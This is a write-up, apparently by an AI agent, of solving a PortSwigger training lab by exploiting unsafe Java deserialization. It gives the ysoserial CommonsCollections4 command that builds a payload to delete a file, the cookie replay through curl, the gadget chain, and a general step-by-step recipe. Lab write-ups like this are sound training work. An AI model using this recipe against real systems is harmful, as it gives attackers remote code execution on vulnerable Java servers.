# PortSwigger Lab

## Lab

Exploiting Java deserialization with Apache Commons

URL: https://0a0100dc030f76cf8086c6c0007600f7.web-security-academy.net/

## Vulnerability Class

Deserialization – Java serialized object in session cookie with Apache Commons Collections gadget chain → remote code execution (arbitrary file delete)

## Objective

Delete `/home/carlos/morale.txt` via malicious Java serialized session object (`CommonsCollections4` + `rm`). Established by lab description objective. Solution command shape (`ysoserial CommonsCollections4 'rm ...'`) seen during description fetch – treated as hypothesis source, validated by evidence (500 trigger + `is-solved`).

## Initial Observations

- `GET /` → 200 `is-notsolved`, empty `session=;`, shop + `/my-account`.
- `POST /login wiener:peter` → 302 to `/my-account?id=wiener`, `session=rO0ABXNyAC9sYWIuYWN0aW9ucy5jb21tb24uc2VyaWFsaXphYmxlLkFjY2Vzc1Rva2VuVXNlchlR/OUSJ6mBAgACTAALYWNjZXNzVG9rZW50ABJMamF2YS9sYW5nL1N0cmluZztMAAh1c2VybmFtZXEAfgABeHB0ACBzOXp6ajd4c3Nlemt2ZnoxZWsyY25xN3d1bGhvZGluOHQABndpZW5lcg%3d%3d`.
- Prefix `rO0A` = Java serialization magic (`0xACED`), vs prior labs' `Tzo0` = PHP `O:`. Different runtime – prior PHP payloads do NOT transfer.
- Decodes to `lab.actions.common.serializable.AccessTokenUser` with `accessToken` + `username`. No `admin`/`avatar_link` fields – prior PHP shapes irrelevant.
- Stored methodology `methodology/deserialization.md` (just created, read) covers PHP property/path abuse only, explicitly notes gadget-chain RCE as future work. No Java/gadget methodology or prior Java labs exist.

## Hypotheses

- H1: Session cookie is Java-serialized and deserialized unsafely on every authenticated request. Replacing it with ysoserial `CommonsCollections4` RCE object executes `rm /home/carlos/morale.txt` during deserialization.
- H2: Trigger request itself may error (500) while side-effect (file delete → solved marker) still occurs. Evidence needed: 500 on trigger + `/` flips to `is-solved`.
- H3: Java 25 needs `--add-opens` flags for ysoserial (per lab hint). Evidence needed: generator runs without `InaccessibleObjectException`.

## Attempts

1. Baseline `GET /` + `POST /login` → Java session captured. Confirmed `rO0` prefix – stopped PHP hypotheses.
2. Downloaded `ysoserial-all.jar` (57M, 2022) to `/tmp/opencode/` – required third-party tool per lab class; no repo equivalent.
3. Generated: `java --add-opens=... -jar ysoserial-all.jar CommonsCollections4 'rm /home/carlos/morale.txt' | base64 -w0` → 4740-char `rO0ABXNyABdqYXZhLnV0...` → URL-encoded (4771 chars).
4. `GET /my-account?id=wiener` with malicious `session` via curl (large cookie – CLI advantageous over manual Burp paste) → `HTTP/2 500` (deserialization-trigger error). WORKED as H2 predicted – error is not failure here.
5. `GET /` anon + via Burp MCP → `is-solved` / `Solved` / `Congratulations`. Solved-marker proof.

## What Failed

- Nothing to retry, but note: 500 on trigger could be misread as “not vulnerable” – in gadget-chain delete labs the trigger response errors while the side-effect solves. Prior PHP labs returned 200/302 on success; different oracle.

## What Worked

- Single malicious session cookie (`CommonsCollections4` + `rm /home/carlos/morale.txt`) sent as `Cookie: session=<url-encoded-payload>` to authenticated endpoint → file delete → global solved marker.

## Burp Observations

- Baseline + login + final verification via Burp MCP `burp_send_http1_request` (evidence-grade: 302 login with Java session, 200 `is-solved` homepage).
- Trigger via curl due to 4.7KB cookie (tool pragmatism – same HTTP semantics). Response `500` recorded.
- `burp_base64_*` not used – payload already base64 from ysoserial; `python urllib.parse.quote` for cookie encoding.

## Browser Observations

- Not required. No JS/state workflow.

## CLI / Tool Observations

- `java -version` → OpenJDK 25.0.4 – confirmed need for `--add-opens=java.xml/...trax`, `...runtime`, `java.base/java.net`, `java.base/java.util` (from lab hint).
- `wget` ysoserial-all.jar from GitHub releases/latest → `/tmp/opencode/` (outside repo – no KB pollution).
- `ysoserial-all.jar CommonsCollections4 'rm /home/carlos/morale.txt' | base64 -w0` → 4740 bytes; URL-encoded 4771 bytes. `curl -sk -i` for trigger (500 captured), `curl -sk` + `grep is-solved` for check, Burp MCP for final proof.

## Root Cause

Unsafe Java deserialization of client-controlled `session` cookie with `commons-collections` on classpath. Attacker bytes instantiate gadget chain (`PriorityQueue`→`TransformingComparator`→`ChainedTransformer`→`Runtime.exec`) during `readObject`, executing OS command server-side. No integrity check, no class allowlist. Prior labs abused object *fields*; this abuses object *construction* (magic methods).

## Verification

- Trigger: malicious cookie → 500 (deserialization path hit).
- Impact: anon `GET /` → `is-solved` + Burp `GET /` → `is-solved`/`Solved`/`Congratulations`. Global marker, not session-local.
- Single variable: only `session` cookie replaced (baseline session → gadget object). Command (`rm /home/carlos/morale.txt`) is the lab-specified side-effect; solved marker is its oracle (no file read needed).

## Impact

Remote code execution as app user (demonstrated file delete). Same primitive yields full compromise (reverse shell, exfiltration) with attacker-chosen command. Higher than prior PHP labs' flag/path abuse.

## Why The Successful Approach Worked

- Distinguished runtime first (`rO0A` Java vs `Tzo0` PHP) – blocked PHP-payload reuse.
- Used pre-built gadget chain instead of hand-editing fields – correct tool for Java + Commons Collections signal (`lab.actions.common.serializable...` + lab title).
- Accepted 500 as trigger oracle (H2) rather than retrying for 200 – RCE side-effect, not content, is the criterion.

## Generalization

- For `rO0`-prefixed session cookies + Commons Collections hint: login → keep session shape as reference → `ysoserial <chain> '<cmd>'` (with `--add-opens` on Java 16+) → base64 → URL-encode → replay as session to any auth endpoint → check solved/state marker even on 500.
- Chain selection: `CommonsCollections4` first where lab names Apache Commons; fall back to `CommonsCollections6`/`CommonsBeanutils1` only on failure (not needed here).
- Trigger endpoint can be any deserializing request (`/my-account?id=...` sufficed) – no need for delete/upload feature as in PHP labs.

## Lessons Learned

- Java vs PHP deserialization are distinct sub-classes: PHP = field-value abuse (lengths, flags, paths); Java+Commons = gadget-chain construction abuse (ysoserial, RCE). Prior PHP discipline (decode, single-variable, solved-marker proof) transfers; payloads do not.
- 500 ≠ failure in RCE-delete labs – check global marker before concluding.
- Toolchain matters: `ysoserial-all.jar` + Java flags + base64 + URL-encode is the load-bearing sequence; record versions (Java 25, 2022 jar, CC4).

## Related Methodology

- Extends `methodology/deserialization.md` (PHP-only, 2 labs) with Java gadget-chain section – update justified below.
- `methodology/injection.md` does NOT apply (SQL/OS-command query/shell vs Java `readObject` gadget execution). Deliberately not modified.
- Prior labs: `deserialization-modifying-serialized-objects.md`, `deserialization-using-application-functionality.md` (encoding/state discipline reused, payloads not).

## References

- Solved instance: https://0a0100dc030f76cf8086c6c0007600f7.web-security-academy.net/
- Lab: https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-exploiting-java-deserialization-with-apache-commons
- ysoserial: https://github.com/frohoff/ysoserial/releases (ysoserial-all.jar, CommonsCollections4)
- Deliberately validated solution command via evidence, not blind trust.
